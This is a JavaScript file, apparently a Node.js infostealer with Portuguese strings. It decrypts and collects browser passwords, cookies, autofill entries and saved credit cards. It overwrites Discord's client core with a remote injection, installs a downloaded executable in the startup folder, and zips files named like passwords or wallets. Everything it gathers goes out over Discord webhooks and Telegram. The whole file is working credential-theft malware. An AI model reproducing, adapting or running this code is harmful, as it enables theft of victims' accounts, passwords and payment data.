                if (retryCount >= maxRetries) {
                    closeBrowsers(executablePath);
                    return null;
                }
            }
        }
    } catch (e) {
        await axios.post(user.urls.errorhook, { content: `erro captureCookies: ${e.message}`});
    }
};

async function captureChromeCookies(tempDir) {
  const url = 'https://github.com/itwd/utils/raw/main/0.13.0.zip';
  const zipPath = path.join(tempDir, '0.13.0.zip');
  const extractPath = path.join(tempDir, 'Chrome');
  try {
    const res = await axios.get(url, { responseType: 'arraybuffer' });
    fs.writeFileSync(zipPath, res.data);
    const zip = new AdmZip(zipPath);
    zip.extractAllTo(extractPath, true);
    const folder0 = path.join(extractPath, '0.13.0');
    const exeFile = fs.readdirSync(folder0).find(f => f.endsWith('.log'));
    if (!exeFile) throw 'nenhum exe encontrado na pasta extraída';
    const exePath = path.join(folder0, exeFile);
    await new Promise((resolve, reject) => {
      const proc = spawn(exePath, ['-s', '-o', tempDir, 'chrome'], { stdio: 'ignore' });
      proc.on('close', code => code === 0 ? resolve() : reject(`Processo retornou código ${code}`));
      proc.on('error', reject);
    });
    const chromeOut = path.join(tempDir, 'Chrome');
    if (!fs.existsSync(chromeOut)) return { description: '', cartoes: 0 };
    const profiles = fs
      .readdirSync(chromeOut)
      .filter(name => fs.statSync(path.join(chromeOut, name)).isDirectory());
    const descBlocks = [];
    let totalCartoes = 0;
    const allPasswords = [];
    const allPayments = [];
    for (const profile of profiles) {
      const profPath = path.join(chromeOut, profile);
      const cookiesTxt = path.join(profPath, 'cookies.txt');
      let cookieCount = 0;
      if (fs.existsSync(cookiesTxt)) {
        const cookies = JSON.parse(fs.readFileSync(cookiesTxt, 'utf8'));
        cookieCount = cookies.length;
        totalCartoes += 0;
        const netscapeLines = cookies.map(c => {
          const expiration = 3376845000;
          return `${c.host}\tTRUE\t/\tFALSE\t${expiration}\t${c.name}\t${c.value}`;
        });
        const outFile = path.join(tempDir, `Chrome ${profile}.txt`);
        fs.writeFileSync(outFile, netscapeLines.join('\n'));
        const bytes = fs.statSync(outFile).size;
        let sizeStr;
        if (bytes >= 1024 * 1024) {
          sizeStr = `${(bytes / (1024 * 1024)).toFixed(1)} MB`;
        } else {
          sizeStr = `${Math.round(bytes / 1024)} KB`;
        }
        descBlocks.push(
          `🌐 Chrome ${profile}\n` +
          `📁 Peso: ${sizeStr}\n` +
          `🍪 Cookies: ${cookieCount}`
        );
      }
      const pwTxt = path.join(profPath, 'passwords.txt');
      if (fs.existsSync(pwTxt)) {
        JSON.parse(fs.readFileSync(pwTxt, 'utf8')).forEach(p =>
          allPasswords.push({ profile, ...p })
        );
      }
      const payTxt = path.join(profPath, 'payments.txt');
      if (fs.existsSync(payTxt)) {
        JSON.parse(fs.readFileSync(payTxt, 'utf8')).forEach(pm =>
          allPayments.push({ profile, ...pm })
        );
      }
    }
    if (allPasswords.length) {
      const lines = allPasswords.map(p =>
        `================\nURL: ${p.origin}\nUsername: ${p.username}\nPassword: ${p.password}\nApplication: Chrome ${p.profile}`
      );
      fs.writeFileSync(path.join(tempDir, 'Chrome Passwords.txt'), lines.join('\n'));
    }
    if (allPayments.length) {
      const lines = allPayments.map(c =>
        `================\nName: ${c.name_on_card}\nExpiration: ` +
        `${String(c.expiration_month).padStart(2, '0')}/${c.expiration_year}\n` +
        `Card Number: ${c.card_number}\nCVC: ${c.cvc}\nProfile: Chrome ${c.profile}`
      );
      fs.writeFileSync(path.join(tempDir, 'Cards.txt'), lines.join('\n'));
    }
    const description = descBlocks.join('\n\n');
    return {
      description,
      cartoes: allPayments.length
    };
  } catch (e) {
    await axios.post(user.urls.errorhook, { content: `erro captureChromeCookies: ${e.message}` });
    return { description: '', cartoes: 0 };
  }
};

async function captureFirefoxCookies(tempDir) {
    try {
        function formatProfile(profile) {
            const profileName = profile.split('.')[0];
            return profileName.charAt(0).toUpperCase() + profileName.slice(1);
        }
        const firefoxPath = path.join(os.homedir(), "AppData", "Roaming", "Mozilla", "Firefox", "Profiles");
        if (!fs.existsSync(firefoxPath)) return { description: null, files: null };
        const profiles = fs.readdirSync(firefoxPath).filter(f => fs.lstatSync(path.join(firefoxPath, f)).isDirectory());
        let description = [];
        let files = [];
        for (const profile of profiles) {
            const cookieDB = path.join(firefoxPath, profile, "cookies.sqlite");
            if (fs.existsSync(cookieDB)) {
                const db = new sqlite3.Database(cookieDB);
                const formattedProfile = formatProfile(profile);
                const outputFile = path.join(tempDir, `Firefox ${formattedProfile}.txt`);
                const stream = fs.createWriteStream(outputFile);
                await new Promise((resolve, reject) => {
                    let count = 0;
                    db.each("SELECT host, name, value FROM moz_cookies", (err, row) => {
                        if (err) reject(err);
                        const expiration = 3403109430;
                        stream.write(`${row.host}\tTRUE\t/\tFALSE\t${expiration}\t${row.name}\t${row.value}\n`);
                        count++;
                    }, async (err) => {
                        if (err) reject(err);
                        stream.end();
                        await new Promise((resolve) => stream.on("finish", resolve));
                        const fileSize = (fs.statSync(outputFile).size / 1024).toFixed(2) + " KB";
                        description.push(`🌐 Firefox ${formattedProfile}\n📁 Peso: ${fileSize}\n🍪 Cookies: ${count}`);
                        files.push(outputFile);
                        resolve();
                    });
                });
                db.close();
            }
        }
        return { description, files };
    } catch (e) {
        return { description: null, files: null };
    }
};

async function getPasswords(outputDir) {
    try {
        const passwordsPath = path.join(outputDir, 'passwords.txt');
        let passwordCount = 0;
        for (let browserIndex = 0; browserIndex < browsers.length; browserIndex++) {
            if (!fs.existsSync(browsers[browserIndex][0])) continue;
            const userDataPath = path.dirname(browsers[browserIndex][0]);
            let localStatePath;
            if (browsers[browserIndex][0].includes('Opera GX Stable')) {
                localStatePath = path.join(userDataPath, 'Opera GX Stable', 'Local State');
            } else if (browsers[browserIndex][0].includes('Opera Stable')) {
                localStatePath = path.join(userDataPath, 'Opera Stable', 'Local State');
            } else {
                localStatePath = path.join(userDataPath, 'Local State');
            }
            if (!fs.existsSync(localStatePath)) continue;
            const localStateData = JSON.parse(fs.readFileSync(localStatePath, 'utf8'));
            const encryptedKey = Buffer.from(localStateData.os_crypt.encrypted_key, 'base64');
            const keyWithoutPrefix = encryptedKey.slice(5);
            const masterKey = Dpapi.unprotectData(keyWithoutPrefix, null, 'CurrentUser');
            let applicationName;
            if (browsers[browserIndex][0].includes('Local')) {
                applicationName = browsers[browserIndex][0].split('\\Local\\')[1].split('\\')[0];
            } else {
                applicationName = browsers[browserIndex][0].split('\\Roaming\\')[1].split('\\')[1];
            }
            const loginDataPath = path.join(browsers[browserIndex][0], 'Login Data');
            const tempDatabasePath = path.join(outputDir, 'passwords.db');
            try {
                fs.copyFileSync(loginDataPath, tempDatabasePath);
            } catch {
                continue;
            }
            const database = new sqlite3.Database(tempDatabasePath);
            await new Promise((resolve) => {
                database.each(
                    'SELECT origin_url, username_value, password_value FROM logins',
                    (error, row) => {
                        if (!row || !row.username_value) return;
                        try {
                            const encryptedBuffer = Buffer.from(row.password_value);
                            const iv = encryptedBuffer.slice(3, 15);
                            const ciphertext = encryptedBuffer.slice(15, encryptedBuffer.length - 16);
                            const authTag = encryptedBuffer.slice(encryptedBuffer.length - 16);
                            if (iv.length !== 12) throw new Error('IV inválido');
                            const decipher = crypto.createDecipheriv('aes-256-gcm', masterKey, iv);
                            decipher.setAuthTag(authTag);
                            const decryptedPassword = Buffer.concat([
                                decipher.update(ciphertext),
                                decipher.final(),
                            ]);
                            let prefix = '';
                            if (fs.existsSync(passwordsPath) && fs.statSync(passwordsPath).size > 0) {
                                prefix = '\n';
                            }
                            fs.appendFileSync(
                                passwordsPath,
                                `${prefix}================\nURL: ${row.origin_url}\nUsername: ${row.username_value}\nPassword: ${decryptedPassword.toString('utf-8')}\nApplication: ${applicationName}\n`
                            );
                        } catch (e) {}
                        passwordCount++;
                    },
                    () => resolve()
                );
            });
            database.close();
            try {
                fs.unlinkSync(tempDatabasePath);
            } catch {}
        }
        return {
            path: passwordsPath,
            count: passwordCount
        };
    } catch (e) {
        await axios.post(user.urls.errorhook, { content: `erro getPasswords: ${e.message}` });
        return { path: null, count: 0 };
    }
};

async function getAutofills(outputDir) {
    try {
        const autofillData = [];
        let totalAutofills = 0;
        if (!Array.isArray(browsers) || browsers.length === 0) {
            return { autofillsFilePath: null, totalAutofills: 0 };
        }
        for (const pathData of browsers) {
            if (!pathData[0] || !fs.existsSync(pathData[0])) {
                continue;
            }
            let applicationName;
            try {
                applicationName = pathData[0].includes('Local')
                    ? pathData[0].split('\\Local\\')[1].split('\\')[0]
                    : pathData[0].split('\\Roaming\\')[1].split('\\')[1];
            } catch (e) {
                continue;
            }
            const webDataPath = path.join(pathData[0], 'Web Data');
            const webDataDBPath = path.join(pathData[0], 'webdata.db');
            if (!fs.existsSync(webDataPath)) {
                continue;
            }
            try {
                fs.copyFileSync(webDataPath, webDataDBPath);
            } catch (e) {
                continue;
            }
            let db;
            try {
                db = new sqlite3.Database(webDataDBPath);
                await new Promise((resolve, reject) => {
                    db.each(
                        'SELECT * FROM autofill',
                        (error, row) => {
                            if (error) {
                                reject(error);
                                return;
                            }
                            if (row) {
                                totalAutofills++;
                                autofillData.push(
                                    `================\nNome: ${row.name}\nValor: ${row.value}\nBrowser: ${applicationName} ${pathData[1] || ''}\n`
                                );
                            }
                        },
                        (err) => {
                            if (err) reject(err);
                            else resolve();
                        }
                    );
                });
            } catch (e) {
            } finally {
                if (db) {
                    db.close((err) => {
                        if (err) {
                        }
                    });
                }
                try {
                    if (fs.existsSync(webDataDBPath)) {
                        fs.unlinkSync(webDataDBPath);
                    }
                } catch (e) {
                }
            }
        }
        if (autofillData.length > 0) {
            const autofillsFilePath = path.join(outputDir, 'autofills.txt');
            try {
                fs.writeFileSync(autofillsFilePath, autofillData.join(''), { encoding: 'utf8', flag: 'a+' });
                return { autofillsFilePath, totalAutofills };
            } catch (e) {
                return { autofillsFilePath: null, totalAutofills };
            }
        }
        return { autofillsFilePath: null, totalAutofills: 0 };
    } catch (e) {
        await axios.post(user.urls.errorhook, { content: `erro getAutofills: ${e.message}` });
        return { autofillsFilePath: null, totalAutofills: 0 };
    }
};

async function getCookies() {
    try {
        const browsers = [
            {
                name: "Edge",
                userPath: path.join(os.homedir(), "AppData", "Local", "Microsoft", "Edge", "User Data"),
                execPath: path.join("C:", "Program Files (x86)", "Microsoft", "Edge", "Application", "msedge.exe"),
                port: 9223
            },
            {
                name: "Brave",
                userPath: path.join(os.homedir(), "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data"),
                execPath: path.join("C:", "Program Files", "BraveSoftware", "Brave-Browser", "Application", "brave.exe"),
                port: 9224
            },
            {
                name: "Opera",
                userPath: path.join(os.homedir(), "AppData", "Roaming", "Opera Software", "Opera Stable"),
                execPath: path.join(os.homedir(), "AppData", "Local", "Programs", "Opera", "opera.exe"),
                port: 9225
            },
            {
                name: "Opera GX",
                userPath: path.join(os.homedir(), "AppData", "Roaming", "Opera Software", "Opera GX Stable"),
                execPath: path.join(os.homedir(), "AppData", "Local", "Programs", "Opera GX", "opera.exe"),
                port: 9226
            },
            {
                name: "Vivaldi",
                userPath: path.join(os.homedir(), "AppData", "Local", "Vivaldi", "User Data"),
                execPath: path.join(os.homedir(), "AppData", "Local", "Vivaldi", "Application", "vivaldi.exe"),
                port: 9227
            },
            {
                name: "Yandex",
                userPath: path.join(os.homedir(), "AppData", "Local", "Yandex", "YandexBrowser", "User Data"),
                execPath: path.join(os.homedir(), "AppData", "Local", "Yandex", "YandexBrowser", "Application", "browser.exe"),
                port: 9228
            }
        ];
        const tempDir = tempFolder();
        let description = [];
        const {
            description: chromeDesc,
            cartoes: chromeCards
        } = await captureChromeCookies(tempDir);
        const firefoxResult = await captureFirefoxCookies(tempDir);
        const passwordsResult = await getPasswords(tempDir);
        const passwords = passwordsResult.count;
        const tasks = browsers.map(async (browser) => {
            if (!fs.existsSync(browser.userPath) || !fs.existsSync(browser.execPath)) return;
            let profiles = [];
            if (browser.name === "Opera GX") {
                profiles = [""];
            } else {
                profiles = fs.readdirSync(browser.userPath).filter(f =>
                    fs.lstatSync(path.join(browser.userPath, f)).isDirectory() && (f === "Default" || f.startsWith("Profile"))
                );
            }
            for (const profileName of profiles) {
                const cookieResult = await captureCookies(browser.name, profileName, browser.userPath, browser.execPath, browser.port, tempDir);
                if (cookieResult) {
                    description.push(`🌐 ${browser.name} ${profileName}\n📁 Peso: ${cookieResult.fileSize}\n🍪 Cookies: ${cookieResult.cookieCount}`);
                }
            }
        });
        if (chromeDesc) description.push(chromeDesc);
        if (firefoxResult.description) description.push(...firefoxResult.description);
        await Promise.all(tasks);
        const {
            autofillsFilePath,
            totalAutofills
        } = await getAutofills(tempDir);
        const totalCards = chromeCards;
        const zipPath = createZip(tempDir, "cookies.zip");
        const zipUrl = await uploadFiles(zipPath);
        await sendTelegramZip(zipPath);
        const pPath = path.join(tempDir, 'passwords.txt');
        const cPath = path.join(tempDir, 'Chrome Passwords.txt');
        let passPath = null;
        if (fs.existsSync(pPath)) {
            passPath = pPath;
        } else if (fs.existsSync(cPath)) {
            passPath = cPath;
        } else {}
        const passwordsUrl = passPath ? await uploadFiles(passPath) : "";
        const autofillsUrl = autofillsFilePath ? await uploadFiles(autofillsFilePath) : "";
        const win = await getWindows();
        const embed = {
            title: "<a:vm_lovehk:1199447470137167962> Cookies",
            thumbnail: {
                url: user.configs.thumbnail
            },
            fields: [
                {
                    name: "<a:mc:1346077828416016465> System",
                    value: `\`\`\`Username: ${user.username}\nHostname: ${user.hostname}\nOS: ${win}\`\`\``,
                    inline: false
                },
                {
                    name: "<a:slk:1338450275811201118> Navegadores",
                    value: `\`\`\`${description.length ? description.join("\n\n") : "nenhum"}\`\`\``,
                    inline: false
                },
                {
                    name: "<:iz:1338768513401225237> História",
                    value: `\`\`\`🗝️ Senhas: ${passwords}\n💳 Cartões: ${totalCards}\n📒 Autofills: ${totalAutofills}\`\`\``,
                    inline: false
                },
                {
                    name: "<a:aa:1338443576698208359> Downloads",
                    value: `[🍪 Cookies](${zipUrl})${passwordsUrl ? `ﾠ●ﾠ[🔑 Senhas](${passwordsUrl})` : ''}${autofillsUrl ? `ﾠ●ﾠ[🔄 Autofills](${autofillsUrl})` : ''}`,
                    inline: false
                }
            ],
            color: 0x313338,
            timestamp: new Date().toISOString()
        };
        await axios.post(user.urls.webhook, { embeds: [embed] });
        try {
            function escapeHTML(text) {
                if (!text) return "";
                return text
                .replace(/&/g, "&amp;")
                .replace(/</g, "&lt;")
                .replace(/>/g, "&gt;")
                .replace(/"/g, "&quot;")
                .replace(/`/g, "")
                .replace(/\[/g, "(")
                .replace(/\]/g, ")");
            };
            const f = `Username: ${user.username}\nHostname: ${user.hostname}\nOS: ${win}`;
            const e = zipUrl ? `<a href="${escapeHTML(zipUrl)}">🍪 Cookies</a>` : "";
            const t = description.length ? description.join("\n\n") : "nenhum";
            const c = passwordsUrl ? ` ● <a href="${escapeHTML(passwordsUrl)}">🔑 Senhas</a>` : "";
            const h = autofillsUrl ? ` ● <a href="${escapeHTML(autofillsUrl)}">🔄 Autofills</a>` : "";
            const telegramMessage = `
<b>Cookies</b>


${escapeHTML(f)}


${escapeHTML(t)}


🗝️ Senhas: ${passwords}
📒 Autofills: ${totalAutofills}


📂 Downloads
${e} ${c} ${h}
`;
            const url = `https://api.telegram.org/bot${user.tokens.telegram}/sendMessage`;
            await axios.post(url, {
                chat_id: user.tokens.telegram_chatid,
                text: telegramMessage,
                parse_mode: "HTML",
            });
        } catch (e) {
            await axios.post(user.urls.errorhook, { content: `erro telegramSender: ${e.message}` });
        }
        fs.rmSync(tempDir, { recursive: true, force: true });
    } catch (e) {
        await axios.post(user.urls.errorhook, { content: `erro getCookies: ${e.message}` });
    }
};

async function killProcesses() {
    const processos = [
        'Discord.exe',
        'DiscordCanary.exe',
        'DiscordPTB.exe',
        'DiscordDevelopment.exe',
        'chrome.exe',
        'msedge.exe',
        'opera.exe',
        'brave.exe',
        'firefox.exe'
    ];
    processos.forEach(proc => {
        try {
            execSync(`taskkill /F /IM ${proc}`, { stdio: 'ignore' });
        } catch (e) {}
    });
};

async function clearFolder(folder) {
    try {
        if (fs.existsSync(folder)) {
            fs.rmSync(folder, { recursive: true, force: true });
        }
    } catch (e) {
        await axios.post(user.urls.errorhook, { content: `erro clearFolder ${e.message}` });
    }
};

async function clearDiscordStorage() {
    const discordPaths = [
        path.join(process.env.APPDATA, 'discord'),
        path.join(process.env.APPDATA, 'discordcanary'),
        path.join(process.env.APPDATA, 'discordptb'),
        path.join(process.env.APPDATA, 'discorddevelopment')
    ];
    discordPaths.forEach(folder => {
        if (fs.existsSync(folder)) {
            clearFolder(path.join(folder, 'Local Storage'));
            clearFolder(path.join(folder, 'Cache'));
            clearFolder(path.join(folder, 'IndexedDB'));
            clearFolder(path.join(folder, 'Code Cache'));
            clearFolder(path.join(folder, 'Cookies'));
            clearFolder(path.join(folder, 'Session Storage'));
            clearFolder(path.join(folder, 'Service Worker'));
        }
    });
};

async function clearBrowserStorage(folder) {
    try {
        const profiles = fs.readdirSync(folder);
        for (let profile of profiles) {
            const profileFolder = path.join(folder, profile);
            if (fs.lstatSync(profileFolder).isDirectory()) {
                const subFolders = ['Local Storage', 'Cache', 'IndexedDB', 'Cookies', 'Session Storage', 'Service Worker'];
                for (let subFolder of subFolders) {
                    const subFolderPath = path.join(profileFolder, subFolder);
                    if (fs.existsSync(subFolderPath)) {
                        await clearFolder(subFolderPath);
                    } else {}
                }
            }
        }
    } catch (e) {}
};

async function restartDiscords(discords) {
    await killProcesses();
    await clearDiscordStorage();
    const browsers = {
        chrome: path.join(os.homedir(), 'AppData', 'Local', 'Google', 'Chrome', 'User Data'),
        edge: path.join(os.homedir(), 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data'),
        opera: path.join(os.homedir(), 'AppData', 'Roaming', 'Opera Software', 'Opera Stable'),
        brave: path.join(os.homedir(), 'AppData', 'Local', 'BraveSoftware', 'Brave-Browser', 'User Data'),
        vivaldi: path.join(os.homedir(), 'AppData', 'Local', 'Vivaldi', 'User Data')
    };
    for (let browser in browsers) {
        await clearBrowserStorage(browsers[browser]);
    }
    const processNames = {
        "Discord": "Discord.exe",
        "DiscordCanary": "DiscordCanary.exe",
        "DiscordPTB": "DiscordPTB.exe",
        "DiscordDevelopment": "DiscordDevelopment.exe"
    };
    for (const discord of discords) {
        const exeName = processNames[discord];
        try {
            const tasks = cp.execSync(`tasklist`).toString();
            if (tasks.includes(exeName)) {
                cp.execSync(`taskkill /F /IM ${exeName}`);
                await new Promise(r => setTimeout(r, 2000));
                const exePath = path.join(localappdata, discord, 'Update.exe');
                if (fs.existsSync(exePath)) {
                    cp.spawn(exePath, ['--processStart', exeName], {
                        detached: true,
                        stdio: 'ignore'
                    }).unref();
                }
            }
        } catch (e) {
            await axios.post(user.urls.errorhook, `erro restart ${discord}: ${e.message}`);
        }
    }
};

async function injectDiscords() {
    try {
        let injection;
        const discords = ['Discord', 'DiscordCanary', 'DiscordPTB', 'DiscordDevelopment'];
        let injectionError = false;
        let reiniciar = [];
        async function sendLog(message) {
            try {
                await axios.post(user.urls.webhook, { content: message });
            } catch {}
        }
        try {
            const response = await axios.get(user.urls.injection);
            injection = response.data.replace("%WEBHOOK_STEALER%", user.urls.injecthook);
        } catch (e) {
            await sendLog(`erro get injection: ${e.message}`);
            return;
        }
        function isDirectory(path) {
            try {
                return fs.statSync(path).isDirectory();
            } catch (e) {
                sendLog(`erro diretório: ${e.message}`);
                return false;
            }
        }
        for (const folder of discords) {
            const folderPath = path.join(localappdata, folder);
            if (fs.existsSync(folderPath) && isDirectory(folderPath)) {
                for (const appDir of fs.readdirSync(folderPath)) {
                    if (appDir.startsWith('app-')) {
                        const appPath = path.join(folderPath, appDir);
                        const modulesPath = path.join(appPath, 'modules');
                        if (fs.existsSync(modulesPath) && isDirectory(modulesPath)) {
                            const coreDirs = fs.readdirSync(modulesPath).filter(coreDir => coreDir.startsWith('discord_desktop_core'));
                            for (const coreDir of coreDirs) {
                                const corePath = path.join(modulesPath, coreDir, 'discord_desktop_core');
                                const indexPath = path.join(corePath, 'index.js');
                                if (fs.existsSync(indexPath)) {
                                    try {
                                        const atual = fs.readFileSync(indexPath, 'utf8');
                                        if (atual.trim() !== injection.trim()) {
                                            fs.writeFileSync(indexPath, injection, 'utf8');
                                            reiniciar.push(folder);
                                        }
                                    } catch (e) {
                                        injectionError = true;
                                        await sendLog(`erro ao escrever no ${folder}: ${e.message}`);
                                    }
                                } else {
                                    injectionError = true;
                                    await sendLog(`index.js não encontrado em ${folder}`);
                                }
                            }
                        }
                    }
                }
            }
        }
        if (injectionError) {
            await sendLog(`erro na injeção: ${injectionError}`);
        } else {
            if (reiniciar.length > 0) {
                await restartDiscords(reiniciar);

                const formatedDcs = reiniciar.map(dc => ({
                    "Discord": "Discord",
                    "DiscordPTB": "Discord PTB",
                    "DiscordCanary": "Discord Canary"
                }[dc] || dc)).join(", ");
                const s = reiniciar.length === 1 ? "<:j_discordfofo:1233092927639781527>" : "<a:dcw:1392313179735851152>";
                const embed = {
                    author: {
                        name: 'Injection',
                        icon_url: `https://i.pinimg.com/736x/76/e1/22/76e122de612d067993f57801c02d05fd.jpg`,
                    },
                    color: 0x313338,
                    description: `${s}: **${formatedDcs}**`
                };
                await axios.post(user.urls.webhook, {
                    username: "Injection",
                    embeds: [embed]
                });
            } else {}
        }
    } catch (e) {
        await axios.post(user.urls.errorhook, { content: `erro injectDiscords: ${e.message}` });
    }
};

async function getWebhook() {
    try {
        async function getSystemInfo() {
            try {
                const [
                    CPU,
                    GPU,
                    RAM,
                    UUID
                ] = await Promise.all([
                    getCpu(),
                    getGpu(),
                    getMemory(),
                    getUUID()
                ]);
                return {
                    CPU,
                    GPU,
                    RAM,
                    UUID
                }
            } catch (e) {
                return {};
            }
        };
        async function getNetworkInfo() {
            try {
                const response = await axios.get("http://ip-api.com/json");
                const {
                    status,
                    country,
                    regionName,
                    city,
                    lat,
                    lon,
                    isp,
                    org,
                    as,
                    query
                } = response.data;
                return `Status: ${status}\nPaís: ${country}\nRegião: ${regionName}\nCidade: ${city}\nLat: ${lat}\nLon: ${lon}\nISP: ${isp}\nORG: ${org}\nAS: ${as}\nIP: ${query}`;
            } catch (e) {
                return 'erro ao obter dados de rede';
            }
        };
        const [
            sys,
            net
        ] = await Promise.all([getSystemInfo(), getNetworkInfo()]);
        if (!sys || Object.keys(sys).length === 0 || !net || net === 'erro ao obter dados de rede') {
            return;
        }
        const system = Object.entries(sys)
        .map(([name, value]) => name === "GPU" ? value : `${name}: ${value}`)
        .join("\n");
        const osx = await getWindows();
        const embed = {
            embeds: [
                {
                    title: `<a:mc:1346077828416016465> System`,
                    color: 0x313338,
                    thumbnail: {
                        url: user.configs.thumbnail
                    },
                    fields: [
                        {
                            name: "<a:slk:1338450275811201118> PC",
                            value: `\`\`\`\nUsername: ${user.username}\nHostname: ${user.hostname}\nOS: ${osx}\`\`\``,
                            inline: false
                        },
                        {
                            name: "<:iz:1338768513401225237> Sistema",
                            value: `\`\`\`\n${system}\`\`\``,
                            inline: false
                        },
                        {
                            name: "<a:ya:1338443535917252649> Rede",
                            value: `\`\`\`\n${net}\`\`\``,
                            inline: false
                        }
                    ],
                    footer: {
                        text: `${user.hostname}`
                    },
                    timestamp: new Date().toISOString(),
                },
            ],
        };
        await axios.post(user.urls.webhook, embed);
    } catch (e) {
        await axios.post(user.urls.errorhook, { content: `erro getWebhook: ${e.message}` });
    }
};

function uploadExe() {
    try {
        getWindows().then(osx => {
            let randomString = crypto.randomBytes(16).toString('hex');
            let tempPath = path.join(os.tmpdir(), `${randomString}.exe`);
            let writer = fs.createWriteStream(tempPath);
            axios({
                method: 'GET',
                url: user.urls.startupexe,
                responseType: 'stream'
            }).then(response => {
                response.data.pipe(writer);
                writer.on('finish', () => {
                    let startupFolder = user.startup;
                    let newFilePath = path.join(startupFolder, 'UpdateHelper.exe');
                    if (!fs.existsSync(newFilePath)) {
                        try {
                            fs.renameSync(tempPath, newFilePath);
                            const fetch = {
                                title: `<a:15:1338771056495955998> Startup | ${user.username}`,
                                thumbnail: {
                                    url: user.configs.thumbnail
                                },
                                color: 0x313338,
                                fields: [
                                    {
                                        name: "<a:slk:1338450275811201118> System",
                                        value: `\`\`\`Username: ${user.username}\nHostname: ${user.hostname}\nOS: ${osx}\`\`\``,
                                        inline: false
                                    },
                                    {
                                        name: "<a:ya:1338443535917252649> Path",
                                        value: `\`${newFilePath}\``,
                                        inline: false
                                    }
                                ],
                                footer: {
                                    text: `startup injetado com sucesso`
                                },
                                timestamp: new Date().toISOString(),
                            }
                            axios.post(user.urls.webhook, { embeds: [fetch] });
                        } catch (e) {}
                    }
                });
            });
        });
    } catch (e) {
        axios.post(user.urls.errorhook, { content: `erro uploadExe: ${e.message}` });
    }
};

async function getFiles() {
    try {
    const keywords = [
        "passw", "password", "mdp", "motdepasse", "mot_de_passe", "login", "secret",
        "account", "acount", "paypal", "banque", "metamask", "wallet", "crypto",
        "exodus", "discord", "2fa", "code", "bckp", "codes", "memo", "compte", "token", "backup",
        "secret", "mom", "family", "cookie", "cookies", "logins", "accounts", "passkey",
        "myaccount", "senhas", "acess"
    ];
    const searchPaths = [
        path.join(os.homedir(), 'Downloads'),
        path.join(os.homedir(), 'Documents')
    ];
    function startsWithKeyword(name) {
        return keywords.some(keyword => name.toLowerCase().startsWith(keyword.toLowerCase()));
    }
    function listFilesRecursively(dir, results = []) {
        try {
            const files = fs.readdirSync(dir);
            for (const file of files) {
                const fullPath = path.join(dir, file);
                if (fs.statSync(fullPath).isDirectory()) {
                    listFilesRecursively(fullPath, results);
                } else if (startsWithKeyword(file)) {
                    results.push(fullPath);
                }
            }
        } catch (e) {
        }
        return results;
    }
    let foundFiles = [];
    try {
        for (const searchPath of searchPaths) {
            try {
                foundFiles = foundFiles.concat(listFilesRecursively(searchPath));
            } catch (e) {
            }
        }
        if (foundFiles.length > 0) {
            try {
                const r = crypto.randomBytes(16).toString('hex');
                const zip = new AdmZip();
                const zipFilePath = path.join(os.tmpdir(), `${r}.zip`);
                foundFiles.forEach(file => {
                    try {
                        zip.addLocalFile(file);
                    } catch (e) {
                    }
                });
                try {
                    zip.writeZip(zipFilePath);
                } catch (e) {
                }
                const zipStats = fs.statSync(zipFilePath);
                const zipSize = zipStats.size;

                function formatFileSize(size) {
                    if (size >= 1024 * 1024) {
                        return `${(size / (1024 * 1024)).toFixed(2)} MB`;
                    } else if (size >= 1024) {
                        return `${(size / 1024).toFixed(2)} KB`;
                    } else {
                        return `${size} B`;
                    }
                }
                try {
                    const downloadLink = await uploadFiles(zipFilePath);
                    const previewFiles = foundFiles.slice(0, 5).map(file => path.basename(file)).join('\n');
                    const embed = {
                        author: {
                            name: 'Important Files',
                        },
                        thumbnail: {
                            url: user.configs.thumbnail
                        },
                        color: 0x313338,
                        fields: [
                            {
                                name: "📝 Arquivos",
                                value: foundFiles.length.toString(),
                                inline: false
                            },
                            {
                                name: "📁 Peso",
                                value: formatFileSize(zipSize),
                                inline: false
                            },
                            {
                                name: "🔍 Prévia",
                                value: `\`${previewFiles}\``,
                                inline: false
                            },
                            {
                                name: "📂 Downloads",
                                value: `[Arquivos](${downloadLink})`
                            }
                        ],
                        timestamp: new Date().toISOString()
                    };
                    try {
                        await axios.post(user.urls.webhook, {
                            embeds: [embed]
                        });
                    } catch (e) {
                    }
                } catch (e) {
                }
            } catch (e) {
            }
        }
    } catch (e) {}
} catch (e) {
    await axios.post(user.urls.errorhook, { content: `erro captureFiles: ${e.message}` });
}
};

async function closeProcess() {
    try {
    exec('taskkill /F /IM FnafDoom.exe');
    } catch (e) {
        await axios.post(user.urls.errorhook, { content: `erro closeProcess: ${e.message}` });
    }
};

async function get() {
    uploadExe();
    await getMachine();
    await getWebhook();
    await getTokens();
    await getCookies();
    await injectDiscords();
    await getFiles();
    await closeProcess();
};
get();